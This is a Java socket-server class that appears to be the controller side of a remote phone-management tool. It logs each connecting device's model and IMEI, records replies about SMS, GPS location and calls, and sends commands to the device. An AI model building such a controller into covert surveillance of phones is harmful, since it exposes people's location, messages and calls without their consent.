import java.io.*;
import java.net.Socket;

public class ClientHandler implements Runnable {
    
    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private ServerGUI gui;
    private String deviceInfo = "Unknown";
    private String imei = "Unknown";

    public ClientHandler(Socket socket, ServerGUI gui) {
        this.socket = socket;
        this.gui = gui;
        
        try {
            this.in = new DataInputStream(socket.getInputStream());
            this.out = new DataOutputStream(socket.getOutputStream());
        } catch (IOException e) {
            gui.log("Client handler error: " + e.getMessage());
        }
    }

    @Override
    public void run() {
        try {
            // Receive device info
            String message = in.readUTF();
            if (message.startsWith("INFO:")) {
                String info = message.substring(5);
                String[] parts = info.split("\\|");
                if (parts.length >= 4) {
                    deviceInfo = parts[1] + " (" + parts[2] + ")";
                    imei = parts[3];
                    gui.log("Device info: " + deviceInfo + " - IMEI: " + imei);
                }
            }

            // Listen for commands
            while (true) {
                String command = in.readUTF();
                gui.log("Response from " + deviceInfo + ": " + command);
                processResponse(command);
            }
        } catch (EOFException e) {
            gui.log("Client disconnected: " + deviceInfo);
            Server.removeClient(this);
        } catch (IOException e) {
            gui.log("Client error: " + e.getMessage());
            Server.removeClient(this);
        }
    }

    private void processResponse(String response) {
        // Process responses from client
        if (response.startsWith("SMS:")) {
            gui.log("SMS Status: " + response.substring(4));
        } else if (response.startsWith("GPS:")) {
            gui.log("GPS Location: " + response.substring(4));
        } else if (response.startsWith("CALL:")) {
            gui.log("Call Status: " + response.substring(5));
        }
    }

    public void sendCommand(String command) throws IOException {
        out.writeUTF(command);
        out.flush();
    }

    public String getDeviceInfo() {
        return deviceInfo;
    }

    public String getIMEI() {
        return imei;
    }
}
